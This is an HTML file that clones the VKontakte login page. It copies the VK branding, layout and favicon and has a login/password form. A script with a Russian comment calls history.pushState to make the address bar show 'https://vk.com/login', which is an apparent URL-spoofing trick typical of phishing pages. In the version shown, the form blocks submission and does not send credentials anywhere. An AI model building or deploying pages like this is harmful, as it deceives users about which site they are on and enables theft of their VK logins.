<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход | ВКонтакте</title>
  <link rel="icon" type="image/png" href="https://vk.com/images/icons/favicons/fav_logo.ico">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f5f5f5;
    }

    header {
      background-color: #45668e;
      padding: 14px 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .vk-logo {
      width: 32px;
      height: 32px;
      background-image: url('https://vk.com/images/icons/favicons/fav_logo.ico');
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: 10px;
    }

    .header-title {
      color: white;
      font-size: 18px;
      font-weight: 500;
      text-transform: lowercase;
    }

    .container {
      max-width: 380px;
      background-color: white;
      margin: 80px auto;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 5px;
    }

    .button {
      width: 100%;
      padding: 10px;
      background-color: #4a76a8;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #3e6694;
    }

    .link {
      display: block;
      margin-top: 20px;
      color: #4a76a8;
      font-size: 14px;
      text-decoration: none;
    }

    .link:hover {
      text-decoration: underline;
    }

    footer {
      text-align: center;
      color: #999;
      font-size: 13px;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <header>
    <div class="vk-logo"></div>
    <div class="header-title">вконтакте</div>
  </header>

  <div class="container">
    <h1>Вход в ВКонтакте</h1>
    <form action="https://vk.com/login" method="POST" id="login-form" onsubmit="return false;">
      <input type="text" class="input-field" placeholder="Телефон или email" required>
      <input type="password" class="input-field" placeholder="Пароль" required>
      <button type="submit" class="button">Войти</button>
    </form>
    <a href="https://vk.com/restore" class="link">Забыли пароль?</a>
  </div>

  <footer>
    &copy; 2025 ВКонтакте LLC
  </footer>

  <script>
    // Меняем URL в адресной строке на vk.com/login
    history.pushState(null, null, 'https://vk.com/login');
  </script>
</body>
</html>
